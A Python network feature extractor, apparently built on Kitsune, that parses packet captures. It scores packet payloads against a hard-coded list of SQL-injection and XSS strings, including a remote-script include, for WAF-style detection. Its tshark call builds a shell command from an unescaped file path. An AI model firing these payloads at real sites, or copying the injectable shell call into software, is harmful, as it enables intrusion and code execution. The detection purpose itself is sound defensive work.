# Check if cython code has been compiled
import os
import subprocess

from scapy.layers.inet import TCP, UDP, IP, ICMP
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import ARP

use_extrapolation = False  # experimental correlation code
if use_extrapolation:
    print("Importing AfterImage Cython Library")
    if not os.path.isfile("AfterImage.c"):  # has not yet been compiled, so try to do so...
        cmd = "python setup.py build_ext --inplace"
        subprocess.call(cmd, shell=True)
# Import dependencies
import netStat as ns
import csv
import numpy as np

print("Importing Scapy Library")
from scapy.all import *
import os.path
import platform
import subprocess


# Extracts Kitsune features from given pcap file one packet at a time using "get_next_vector()"
# If wireshark is installed (tshark) it is used to parse (it's faster), otherwise, scapy is used (much slower).
# If wireshark is used then a tsv file (parsed version of the pcap) will be made -which you can use as your input next time
class FE:
    def __init__(self, file_path, limit=np.inf, dataset=False):
        self.path = file_path
        self.limit = limit
        self.parse_type = None  # unknown
        self.curPacketIndx = 0
        self.tsvin = None  # used for parsing TSV file
        self.scapyin = None  # used for parsing pcap with scapy
        self.dataset = dataset

        # We need to collect 100 malicious payloads!
        self.attack = []

        self.attack += [b"or true--"]
        self.attack += [b'" or true--']
        self.attack += [b"' or true--"]
        self.attack += [b'") or true--']
        self.attack += [b"') or true--"]
        self.attack += [b"' or 'x'='x"]
        self.attack += [b"') or ('x')=('x"]
        self.attack += [b"')) or (('x'))=(('x"]
        self.attack += [b'" or "x"="x']
        self.attack += [b'") or ("x")=("x']
        self.attack += [b'")) or (("x"))=(("x']
        self.attack += [b"or 1=1"]
        self.attack += [b"or 1=1--"]
        self.attack += [b"or 1=1#"]
        self.attack += [b"or 1=1/*"]
        self.attack += [b"admin' --"]
        self.attack += [b"admin' #"]
        self.attack += [b"admin'/*"]
        self.attack += [b"admin' or '1'='1"]
        self.attack += [b"admin' or '1'='1'--"]
        self.attack += [b"admin' or '1'='1'#"]
        self.attack += [b"admin' or '1'='1'/*"]
        self.attack += [b"admin'or 1=1 or ''='"]
        self.attack += [b"admin' or 1=1"]
        self.attack += [b"admin' or 1=1--"]
        self.attack += [b"admin' or 1=1#"]
        self.attack += [b"admin' or 1=1/*"]
        self.attack += [b"admin') or ('1'='1"]
        self.attack += [b"admin') or ('1'='1'--"]
        self.attack += [b"admin') or ('1'='1'#"]
        self.attack += [b"admin') or ('1'='1'/*"]
        self.attack += [b"admin') or '1'='1"]
        self.attack += [b"admin') or '1'='1'--"]
        self.attack += [b"admin') or '1'='1'#"]
        self.attack += [b"admin') or '1'='1'/*"]
        self.attack += [b"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"]
        self.attack += [b'admin" --']
        self.attack += [b'admin" #']
        self.attack += [b'admin"/*']
        self.attack += [b'admin" or "1"="1']
        self.attack += [b'admin" or "1"="1"--']
        self.attack += [b'admin" or "1"="1"#']
        self.attack += [b'admin" or "1"="1"/*']
        self.attack += [b'admin"or 1=1 or ""="']
        self.attack += [b'admin" or 1=1']
        self.attack += [b'admin" or 1=1--']
        self.attack += [b'admin" or 1=1#']
        self.attack += [b'admin" or 1=1/*']
        self.attack += [b'admin") or ("1"="1']
        self.attack += [b'admin") or ("1"="1"--']

        self.attack += [b'<svg onload=alert(1)>']
        self.attack += [b'"><svg onload=alert(1)//']
        self.attack += [b'"onmouseover=alert(1)//']
        self.attack += [b'"autofocus/onfocus=alert(1)//']
        self.attack += [b"'-alert(1)-'"]
        self.attack += [b"'-alert(1)//"]
        self.attack += [b'\'-alert(1)//']
        self.attack += [b'</script><svg onload=alert(1)>']
        self.attack += [b'<x contenteditable onblur=alert(1)>lose focus!']
        self.attack += [b'<x onclick=alert(1)>click this!']
        self.attack += [b'<x oncopy=alert(1)>copy this!']
        self.attack += [b'<x oncontextmenu=alert(1)>right click this!']
        self.attack += [b'<x oncut=alert(1)>copy this!']
        self.attack += [b'<x ondblclick=alert(1)>double click this!']
        self.attack += [b'<x ondrag=alert(1)>drag this!']
        self.attack += [b'<x contenteditable onfocus=alert(1)>focus this!']
        self.attack += [b'<x contenteditable oninput=alert(1)>input here!']
        self.attack += [b'<x contenteditable onkeydown=alert(1)>press any key!']
        self.attack += [b'<x contenteditable onkeypress=alert(1)>press any key!']
        self.attack += [b'<x contenteditable onkeyup=alert(1)>press any key!']
        self.attack += [b'<x onmousedown=alert(1)>click this!']
        self.attack += [b'<x onmousemove=alert(1)>hover this!']
        self.attack += [b'<x onmouseout=alert(1)>hover this!']
        self.attack += [b'<x onmouseover=alert(1)>hover this!']
        self.attack += [b'<x onmouseup=alert(1)>click this!']
        self.attack += [b'<x contenteditable onpaste=alert(1)>paste here!']
        self.attack += [b'<script>alert(1)//']
        self.attack += [b'<script>alert(1)<!']
        self.attack += [b'<script src=//brutelogic.com.br/1.js>']
        self.attack += [b'<script src=//3334957647/1>']
        self.attack += [b'%3Cx onxxx=alert(1)']
        self.attack += [b'<%78 onxxx=1']
        self.attack += [b'<x %6Fnxxx=1']
        self.attack += [b'<x o%6Exxx=1']
        self.attack += [b'<x on%78xx=1']
        self.attack += [b'<x onxxx%3D1']
        self.attack += [b'<X onxxx=1']
        self.attack += [b'<x OnXxx=1']
        self.attack += [b'<X OnXxx=1']
        self.attack += [b'<x onxxx=1 onxxx=1']
        self.attack += [b'<x/onxxx=1']
        self.attack += [b'<x%09onxxx=1']
        self.attack += [b'<x%0Aonxxx=1']
        self.attack += [b'<x%0Conxxx=1']
        self.attack += [b'<x%0Donxxx=1']
        self.attack += [b'<x%2Fonxxx=1']
        self.attack += [b"<x 1='1'onxxx=1"]
        self.attack += [b'<x 1="1"onxxx=1']
        self.attack += [b'<x </onxxx=1']
        self.attack += [b'<x 1=">" onxxx=1']

        ### Prep pcap ##
        self.__prep__()

        ### Prep Feature extractor (AfterImage) ###
        maxHost = 100000000000
        maxSess = 100000000000
        self.nstat = ns.netStat(np.nan, maxHost, maxSess)

    def _get_tshark_path(self):
        if platform.system() == 'Windows':
            return 'C:\\Program Files\\Wireshark\\tshark.exe'
        else:
            system_path = os.environ['PATH']
            for path in system_path.split(os.pathsep):
                filename = os.path.join(path, 'tshark')
                if os.path.isfile(filename):
                    return filename
        return ''

    def levenshtein(self, s1, s2):
        if len(s1) < len(s2):
            return self.levenshtein(s2, s1)

        if len(s2) == 0:
            return len(s1)

        previous_row = range(len(s2) + 1)
        for i, c1 in enumerate(s1):
            current_row = [i + 1]
            for j, c2 in enumerate(s2):
                insertions = previous_row[j + 1] + 1
                deletions = current_row[j] + 1
                substitutions = previous_row[j] + (c1 != c2)
                current_row.append(min(insertions, deletions, substitutions))

            previous_row = current_row

        return previous_row[-1]

    def waf_score(self, p1, p2):
        len_l = 1
        len_s = 1
        l_payload = '1'
        s_payload = '1'

        if len(p1) >= len(p2):
            l_payload = p1
            s_payload = p2
            len_l = len(p1)
            len_s = len(p2)
        else:
            l_payload = p2
            s_payload = p1
            len_l = len(p2)
            len_s = len(p1)

        min_val = 99999
        for i in range(0, len_l - len_s):
            # print(l_payload[i:len_s + i], s_payload)
            # print(self.levenshtein(s_payload, l_payload[i:len_s + i]))
            min_val = min(min_val, self.levenshtein(s_payload, l_payload[i:len_s + i]))
        return np.float64(min_val / len_s)

    def __prep__(self):
        ### Find file: ###
        if not os.path.isfile(self.path):  # file does not exist
            print("File: " + self.path + " does not exist")
            raise Exception()

        ### check file type ###
        type = self.path.split('.')[-1]

        self._tshark = self._get_tshark_path()
        ##If file is TSV (pre-parsed by wireshark script)
        if type == "tsv":
            self.parse_type = "tsv"

        ##If file is pcap
        elif type == "pcap" or type == 'pcapng':
            # Try parsing via tshark dll of wireshark (faster)
            if os.path.isfile(self._tshark) and self.dataset is not True:
                self.pcap2tsv_with_tshark()  # creates local tsv file
                self.path += ".tsv"
                self.parse_type = "tsv"
            else:  # Otherwise, parse with scapy (slower)
                print("tshark not found. Trying scapy...")
                self.parse_type = "scapy"
        else:
            print("File: " + self.path + " is not a tsv or pcap file")
            raise Exception()

        ### open readers ##
        if self.parse_type == "tsv" and self.dataset is not True:
            maxInt = sys.maxsize
            decrement = True
            while decrement:
                # decrease the maxInt value by factor 10
                # as long as the OverflowError occurs.
                decrement = False
                try:
                    csv.field_size_limit(maxInt)
                except OverflowError:
                    maxInt = int(maxInt / 10)
                    decrement = True

            print("counting lines in file...")
            num_lines = sum(1 for line in open(self.path))
            print("There are " + str(num_lines) + " Packets.")
            self.limit = min(self.limit, num_lines - 1)
            self.tsvinf = open(self.path, 'rt', encoding="utf8")
            self.tsvin = csv.reader(self.tsvinf, delimiter='\t')
            row = self.tsvin.__next__()  # move iterator past header

        else:  # scapy
            print("Reading PCAP file via Scapy...")
            self.scapyin = rdpcap(self.path)
            self.limit = len(self.scapyin)
            print("Loaded " + str(len(self.scapyin)) + " Packets.")

    def get_next_vector(self):
        if self.curPacketIndx == self.limit:
            if self.parse_type == 'tsv':
                self.tsvinf.close()
            return []

        ### Parse next packet ###
        if self.parse_type == "tsv" and self.dataset is not True:
            row = self.tsvin.__next__()
            IPtype = np.nan
            timestamp = row[0]
            framelen = row[1]
            srcIP = ''
            dstIP = ''
            if row[4] != '':  # IPv4
                srcIP = row[4]
                dstIP = row[5]
                IPtype = 0
            elif row[17] != '':  # ipv6
                srcIP = row[17]
                dstIP = row[18]
                IPtype = 1
            srcproto = row[6] + row[
                8]  # UDP or TCP port: the concatenation of the two port strings will will results in an OR "[tcp|udp]"
            dstproto = row[7] + row[9]  # UDP or TCP port
            srcMAC = row[2]
            dstMAC = row[3]
            if srcproto == '':  # it's a L2/L1 level protocol
                if row[12] != '':  # is ARP
                    srcproto = 'arp'
                    dstproto = 'arp'
                    srcIP = row[14]  # src IP (ARP)
                    dstIP = row[16]  # dst IP (ARP)
                    IPtype = 0
                elif row[10] != '':  # is ICMP
                    srcproto = 'icmp'
                    dstproto = 'icmp'
                    IPtype = 0
                elif srcIP + srcproto + dstIP + dstproto == '':  # some other protocol
                    srcIP = row[2]  # src MAC
                    dstIP = row[3]  # dst MAC

        elif self.parse_type == "scapy":
            packet = self.scapyin[self.curPacketIndx]

            if self.dataset is not True:
                IPtype = np.nan
                timestamp = packet.time
                framelen = len(packet)
                if packet.haslayer(IP):  # IPv4
                    srcIP = packet[IP].src
                    dstIP = packet[IP].dst
                    IPtype = 0
                elif packet.haslayer(IPv6):  # ipv6
                    srcIP = packet[IPv6].src
                    dstIP = packet[IPv6].dst
                    IPtype = 1
                else:
                    srcIP = ''
                    dstIP = ''

                if packet.haslayer(TCP):
                    srcproto = str(packet[TCP].sport)
                    dstproto = str(packet[TCP].dport)
                elif packet.haslayer(UDP):
                    srcproto = str(packet[UDP].sport)
                    dstproto = str(packet[UDP].dport)
                else:
                    srcproto = ''
                    dstproto = ''

                srcMAC = packet.src
                dstMAC = packet.dst
                if srcproto == '':  # it's a L2/L1 level protocol
                    if packet.haslayer(ARP):  # is ARP
                        srcproto = 'arp'
                        dstproto = 'arp'
                        srcIP = packet[ARP].psrc  # src IP (ARP)
                        dstIP = packet[ARP].pdst  # dst IP (ARP)
                        IPtype = 0
                    elif packet.haslayer(ICMP):  # is ICMP
                        srcproto = 'icmp'
                        dstproto = 'icmp'
                        IPtype = 0
                    elif srcIP + srcproto + dstIP + dstproto == '':  # some other protocol
                        srcIP = packet.src  # src MAC
                        dstIP = packet.dst  # dst MAC
        else:
            return []

        self.curPacketIndx = self.curPacketIndx + 1

        ### Extract Features
        try:
            if self.dataset is not True:
                return self.nstat.updateGetStats(IPtype, srcMAC, dstMAC, srcIP, srcproto, dstIP, dstproto,
                                                 int(framelen),
                                                 float(timestamp))
            else:
                lst = []
                for i in range(0, 100):
                    lst.append(self.waf_score(self.attack[i], self.scapyin[self.curPacketIndx].load))
                res = np.array(lst)
                print(self.curPacketIndx)
                print(res)
                print("-------------------------------")
                return res
        except Exception as e:
            print(e)
            return []

    def pcap2tsv_with_tshark(self):
        print('Parsing with tshark...')
        fields = "-e frame.time_epoch -e frame.len -e eth.src -e eth.dst -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport -e icmp.type -e icmp.code -e arp.opcode -e arp.src.hw_mac -e arp.src.proto_ipv4 -e arp.dst.hw_mac -e arp.dst.proto_ipv4 -e ipv6.src -e ipv6.dst"
        cmd = '"' + self._tshark + '" -r ' + self.path + ' -T fields ' + fields + ' -E header=y -E occurrence=f > ' + self.path + ".tsv"
        subprocess.call(cmd, shell=True)
        print("tshark parsing complete. File saved as: " + self.path + ".tsv")

    def get_num_features(self):
        return len(self.nstat.getNetStatHeaders())
